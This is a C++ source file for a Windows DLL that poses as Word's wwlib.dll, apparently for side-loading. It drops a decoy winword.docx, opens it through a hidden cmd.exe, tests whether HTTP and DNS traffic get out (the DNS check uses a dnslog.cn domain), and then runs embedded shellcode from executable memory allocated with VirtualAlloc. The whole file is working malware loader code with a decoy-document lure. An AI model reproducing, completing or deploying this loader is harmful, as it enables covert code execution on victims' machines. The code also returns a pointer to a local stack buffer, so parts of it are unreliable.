#include "pch.h"
#include <afxinet.h>
#include <WinSock2.h>
#include <WinDNS.h>
#include "resource2.h"
#include "string.h"

extern "C" __declspec(dllexport) int FMain(int a, int b, int c, int d);
extern "C" __declspec(dllexport) void wdCommandDispatch();
extern "C" __declspec(dllexport) void wdGetApplicationObject();
//extern "C" __declspec(dllexport) void DllCanUnloadNow(); //确定是否正在使用实现此功能的DLL。如果不是，则调用者可以从内存中卸载DLL。,不能重新定义
//extern "C" __declspec(dllexport) void DllGetClassObject();
//extern "C" __declspec(dllexport) void DllGetLCID();

//#include <windows.h>

#pragma comment (lib, "Dnsapi.lib")
#pragma comment (lib, "ws2_32.lib")

HMODULE g_hinstance=::GetModuleHandle("wwlib.dll");


DWORD reslen;
const void* pResource;




bool isHTTPEnable()

{
	// 建立会话

	HINTERNET hInternet;

	hInternet = InternetOpen("", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if (hInternet == NULL)  return false;

	// 建立连接

	HINTERNET hConnect;

	hConnect = InternetConnect(hInternet, "www.baidu.com", INTERNET_INVALID_PORT_NUMBER,

		"", "", INTERNET_SERVICE_HTTP, INTERNET_FLAG_PASSIVE, 0);

	if (hInternet == NULL)

	{
		InternetCloseHandle(hInternet);

		return false;

	}

	HINTERNET httpFile;

	httpFile = HttpOpenRequest(hConnect, "GET", "/index.php", HTTP_VERSION, NULL, 0, INTERNET_FLAG_NO_UI | INTERNET_FLAG_DONT_CACHE, 1);

	if (httpFile == NULL)

	{

		InternetCloseHandle(hConnect);

		InternetCloseHandle(hInternet);

		return false;

	}

	HttpSendRequest(httpFile, NULL, NULL, 0, 0);

	char buf[1024];

	DWORD buf_len = 1024;

	DWORD buf_read = 1024;

	//FILE *fp = fopen("c:\\test.txt", "wb");

	while (1)

	{
		InternetReadFile(httpFile, buf, buf_len, &buf_read);

		if (buf_read == 0) {
			break;
		}


		//fwrite(buf, 1, buf_read, fp);
		//std::cout << buf << std::endl;

	}

	//	fclose(fp);



	InternetCloseHandle(httpFile);

	InternetCloseHandle(hConnect);

	InternetCloseHandle(hInternet);

	//	std::cout << buf_len << std::endl;
	//	std::cout << strlen(buf) << std::endl;

	if (strlen(buf) > 20) {
		return true;
	}

	return false;

}

bool isDNSEnable() {
	PDNS_RECORD pResult = NULL;
	DNS_STATUS dnsStatus = 0;

	dnsStatus = DnsQuery_A("mig.dnslog.cn", DNS_TYPE_A, DNS_QUERY_STANDARD/*DNS_QUERY_STANDARD*/, NULL, &pResult, NULL);
	PDNS_RECORD temp = pResult;
	while (temp)
	{
		IN_ADDR ipaddr;
		ipaddr.S_un.S_addr = temp->Data.A.IpAddress;
		char *pAddr = inet_ntoa(ipaddr);

		if (*pAddr) {
			return true;
		}

		//printf("Addr:%s \n", pAddr);
		temp = temp->pNext;
	}

	DnsRecordListFree(pResult, DnsFreeRecordListDeep);
	return FALSE;
}



bool ExportToFile(const char* & exportFilePath, const void* pBuffer, DWORD bufferLength)
{
	if (pBuffer == NULL || bufferLength <= 0)
	{
		return false;
	}
	HANDLE hFile = ::CreateFile(exportFilePath,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile == NULL)
	{
		return false;
	}

	DWORD writetem = -1;
	BOOL ret = ::WriteFile(hFile, pBuffer, bufferLength, &writetem, NULL);
	if (writetem != bufferLength)
	{
		::CloseHandle(hFile);
		return false;
	}

	::CloseHandle(hFile);
	return true;
}

/**
* exportPath:文件路径，
* resourceId:资源ID ：Resource.h中
* 导出资源包转成指定文件
*/
byte* ExportRes(DWORD resourceId)
{



	HINSTANCE m_hInstance = g_hinstance;

	HRSRC hrSrc = FindResource(m_hInstance, MAKEINTRESOURCE(resourceId), _T("bin"));
	if (hrSrc == NULL)
	{
		return false;
	}
	HGLOBAL hGlobalResource = LoadResource(m_hInstance, hrSrc);
	if (hGlobalResource == NULL)
	{
		return false;
	}

	const void* pResourceData = ::LockResource(hGlobalResource);
	if (!pResourceData)
	{
		return false;
	}

	DWORD resLength = SizeofResource(m_hInstance, hrSrc);
	//reslen = resLength;
	//pResource = pResourceData;
	
	

	byte shellbinbuf[1024 * 20] = { 0 };
	memcpy(shellbinbuf,pResourceData,resLength);

	//byte* shellbinbuf = new byte[resLength];
	//memcpy(shellbinbuf, pResourceData,resLength);


	//byte* shellbinbuf = new byte(resLength);
	//ZeroMemory(shellbinbuf,resLength);

	//memcpy(shellbinbuf,pResourceData,resLength);
	//const DWORD sizebinbuf = resLength;
	//int size = resLength;
	
	
	//char shellcharbuf[1024 * 100] = {0};
	//有问题   导致shellcode不能执行
	//char* shellcharbuf = new char(resLength*sizeof(tmp)*sizeof(byte));
	//shellcharbuf[0] = '\0';
	//ZeroMemory(shellcharbuf, resLength);
	//ZeroMemory(shellcharbuf, resLength);
	//int lens = sizeof(shellbinbuf);
	//int i = 0;

	/*
	
	*/
	

//	char tmp[5];
	//将byte类型转为小写的十六进制
//;	for (int i = 0; i < resLength; i++) {
//		sprintf(tmp, "\\x%02x",shellbinbuf[i]);
//		//sprintf(shellcharbuf, "%s%s", shellcharbuf, tmp);
//		strncat(shellcharbuf, tmp, sizeof(tmp));
//	}
/*
		n++;
		if (1 == n) sprintf(shellcharbuf, "\"\\x%02X",shellbinbuf[i]);
		else {
			if (1 == n % 16) sprintf(shellcharbuf, "\"\n\"\\x%02X", shellbinbuf[i]);
			else sprintf(shellcharbuf, "\\x%02X", shellbinbuf[i]);
		}
		*/
//	

	//MessageBoxA(NULL, shellcharbuf, "test", NULL);

	//bool ret = ExportToFile(exportPath, shellcharbuf, resLength);

	
	FreeResource(hGlobalResource);
//	delete shellbinbuf;
	//delete shellcharbuf;
	//char buf[1024*10] ;
	//strcpy(buf,shellcharbuf);
	//delete shellcharbuf;
	return shellbinbuf;
}



bool ExportDoc(const char* exportPath, DWORD resourceId)
{
	HINSTANCE m_hInstance = g_hinstance;

	HRSRC hrSrc = FindResource(m_hInstance, MAKEINTRESOURCE(resourceId), _T("doc"));
	if (hrSrc == NULL)
	{
		return false;
	}
	HGLOBAL hGlobalResource = LoadResource(m_hInstance, hrSrc);
	if (hGlobalResource == NULL)
	{
		return false;
	}

	const void* pResourceData = ::LockResource(hGlobalResource);
	if (!pResourceData)
	{
		return false;
	}

	DWORD resLength = SizeofResource(m_hInstance, hrSrc);
	//reslen = resLength;
	//pResource = pResourceData;
    bool ret = ExportToFile(exportPath, pResourceData, resLength);
    FreeResource(hGlobalResource);
    return ret;
}


BOOL system_hide(char* CommandLine)
{
	SECURITY_ATTRIBUTES   sa;
	HANDLE   hRead, hWrite;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		return   FALSE;
	}

	STARTUPINFO   si;
	PROCESS_INFORMATION   pi;
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	//关键步骤，CreateProcess函数参数意义请查阅MSDN     
	if (!CreateProcess(NULL, CommandLine, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
	{
		return   FALSE;
	}
	CloseHandle(hWrite);
	return   TRUE;
}


int FMain(int a, int b, int c, int d) {

	TCHAR szDIR[256];
	GetCurrentDirectory(256, szDIR);
	strcat_s(szDIR,"\\winword.docx");
	if (ExportDoc(szDIR, IDR_DOC) ){
		char cmdline[256 * 2] = "cmd.exe /c";
		strcat(cmdline,szDIR);
		system_hide(cmdline);
	}
	

	if (isHTTPEnable()) {
		//MessageBoxA(NULL,"httpenable","",NULL);
		byte* buf2 = ExportRes(IDR_HTTPBIN);
		byte buf[1024 * 20] = { 0 };
		memcpy(buf, buf2, 1024 * 20);
		LPVOID Memory = VirtualAlloc(NULL, 1024 * 20, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		memcpy(Memory, buf, sizeof(buf));
		((void(*)())Memory)();
	}
	if (isDNSEnable()) {
		byte* dnsbuf = ExportRes(IDR_DNSBIN);
		byte buf[1024 * 20] = { 0 };
		memcpy(buf, dnsbuf, 1024 * 20);
		LPVOID Memory = VirtualAlloc(NULL, 1024 * 20, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		memcpy(Memory, buf, sizeof(buf));
		((void(*)())Memory)();
	}
	

	exit(0);
	return 1;
}
void wdCommandDispatch() {

}
void wdGetApplicationObject() {
}
BOOL APIENTRY DllMain(
	HINSTANCE hinstDLL,  // handle to DLL module
	DWORD fdwReason,     // reason for calling function
	LPVOID lpReserved)  // reserved
{
	// Perform actions based on the reason for calling.
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		// Initialize once for each new process.
		// Return FALSE to fail DLL load.
		break;
	case DLL_THREAD_ATTACH:
		// Do thread-specific initialization.
		break;
	case DLL_THREAD_DETACH:
		// Do thread-specific cleanup.
		break;
	case DLL_PROCESS_DETACH:
		// Perform any necessary cleanup.
		break;
	}
	return TRUE;  // Successful DLL_PROCESS_ATTACH.
}